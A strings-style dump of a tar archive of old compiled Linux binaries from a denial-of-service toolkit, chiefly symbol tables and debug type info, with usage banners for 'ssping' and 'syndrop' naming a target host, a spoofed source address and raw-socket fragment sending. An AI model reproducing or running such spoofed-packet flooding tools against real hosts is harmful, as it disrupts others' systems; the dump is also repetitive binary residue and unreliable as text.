            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "spiffit.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fprintf@@GLIBC_2.0",
            "bcopy@@GLIBC_2.0",
            "_init",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "setsockopt@@GLIBC_2.0",
            "_start",
            "strlen@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "_fini",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "_IO_stdin_used",
            "sprintf@@GLIBC_2.0",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/ssping",
            "0100755",
            "0000000",
            "0000000",
            "00000034634",
            "07100656677",
            "013411",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "perror",
            "socket",
            "bzero",
            "fprintf",
            "inet_addr",
            "__deregister_frame_info",
            "setsockopt",
            "sendto",
            "bcopy",
            "inet_ntoa",
            "gethostbyname",
            "stderr",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "close",
            "GLIBC_2.0",
            "1^PTRh",
            "QVh@",
            "Shdd",
            "E;<~",
            "Lf\u01c5H",
            "ddfY",
            "hPEP }-DPh(",
            "\u0403;u[]",
            "SSPing v1.0 Yet ANOTHER windows95(And macOS!) glitch",
            "usage: %s <dstaddr> <saddr> [number]",
            "\tdstaddr is the host your attacking",
            "\tsaddr is the host your spoofing from",
            "\tNumber is the number of packets to send, 5 is the default",
            "NOTE:  This is based on a bug that used to affect POSIX complient, and SYSV ",
            "\t systems so its nothing new..",
            "Greets to Bill Gates! How do ya like this one? :-)",
            "socket",
            "IP_HDRINCL",
            "%s: unknown host",
            "Sending to %s",
            "offset %d: ",
            "sendto",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "ssping.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fprintf@@GLIBC_2.0",
            "bcopy@@GLIBC_2.0",
            "inet_ntoa@@GLIBC_2.0",
            "_init",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "setsockopt@@GLIBC_2.0",
            "_start",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "gethostbyname@@GLIBC_2.0",
            "bzero@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/syndrop",
            "0100755",
            "0000000",
            "0000000",
            "00000036771",
            "07100656703",
            "013576",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "random",
            "memcpy",
            "perror",
            "malloc",
            "optarg",
            "socket",
            "bzero",
            "fprintf",
            "inet_addr",
            "__deregister_frame_info",
            "setsockopt",
            "sendto",
            "bcopy",
            "getopt",
            "inet_ntoa",
            "time",
            "gethostbyname",
            "stderr",
            "srandom",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "free",
            "GLIBC_2.0",
            "1^PTRh$",
            "QVhp",
            "U4SE",
            "EP }!h",
            "fEcv",
            "u7E\u0539",
            ")\u044bE)fEf}",
            "u7nE\u0539",
            ")\u044bE)fE}",
            "EE1fEPEP",
            "EE1fEPEP",
            "E;E|",
            "EPEP1fEP1fEPEPEPEPB",
            "E\uba03h\"",
            "U4SE",
            "fEfUE",
            "fEfEE",
            "EEEj0EPO",
            "EPEP",
            "EPE@P",
            "1fEP",
            "1fEP",
            "EEU M",
            "j<EPE",
            "PU u3h",
            "]EU ",
            "P u2h",
            "Uu=E",
            "1)EP",
            "REPEP",
            "\u0403;u[]",
            "syndrop by PineKoan",
            "raw socket",
            "IP_HDRINCL",
            "What the hell kind of IP address is that?",
            "s:t:n:S:E:",
            "Death on flaxen wings:",
            "From: %15s.%5d",
            "  To: %15s.%5d",
            " Amt: %5d",
            "b00m ",
            "sendto",
            "%s src_ip dst_ip [ -s src_prt ] [ -t dst_prt ] [ -n how_many ]",
            "[ -S sequence_start] [ -E sequence_end ]",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "syndrop.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "usage",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fprintf@@GLIBC_2.0",
            "bcopy@@GLIBC_2.0",
            "inet_ntoa@@GLIBC_2.0",
            "random@@GLIBC_2.0",
            "_init",
            "malloc@@GLIBC_2.0",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "name_resolve",
            "stderr@@GLIBC_2.0",
            "setsockopt@@GLIBC_2.0",
            "time@@GLIBC_2.0",
            "_start",
            "getopt@@GLIBC_2.0",
            "send_frags",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "_fini",
            "memcpy@@GLIBC_2.0",
